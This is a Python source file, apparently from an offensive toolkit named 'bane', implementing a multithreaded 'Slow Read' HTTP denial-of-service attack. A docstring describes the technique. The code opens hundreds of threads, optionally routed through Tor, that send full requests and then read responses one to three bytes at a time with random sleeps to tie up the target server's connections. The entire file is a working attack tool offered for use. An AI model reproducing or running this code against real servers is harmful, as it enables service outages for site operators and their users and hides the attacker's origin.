from bane.ddos.utils import *
"""
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

"""


class Slow_Read(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        paths=["/"],
        threads_daemon=True,
        threads=500,
        timeout=5,
        min_speed=3,
        max_speed=5,
        max_read=3,
        min_read=1,
        logs=False,
        tor=False,
        duration=60,
        ssl_on=False,
    ):
        self.ssl_on=ssl_on
        self.counter = 0
        self.fails=0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = Common_Variables.user_agents_list
        self.stop = False
        self.target = u
        self.port = p
        self.paths = paths
        self.timeout = timeout
        self.tor = tor
        self.read_max = max_read
        self.read_min = min_read
        self.min_speed = min_speed
        self.max_speed = max_speed
        self.logs = logs
        self.duration = duration
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    while True:
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(
                                Socket_Connection.setup_http_packet(
                                    self.target,
                                    3,
                                    self.paths,
                                    2,
                                    8,
                                    10,
                                    50,
                                    self.cookie,
                                    self.user_agents,
                                ).encode("utf-8")
                            )
                            self.counter += 1
                            while True:
                                d = s.recv(random.randint(self.read_min, self.read_max))
                                if self.logs == True:
                                    sys.stdout.write(
                                        "\rReceived: {}   ".format(
                                            str(d.decode("utf-8").strip())
                                        )
                                    )
                                    sys.stdout.flush()
                                    # print("Received: {}".format(str(d.decode('utf-8'))))
                                time.sleep(random.randint(self.min_speed, self.max_speed))
                        except:
                            self.fails+=1
                            break
                    s.close()
                except:
                    self.fails+=1
            self.kill()
        except:
            pass
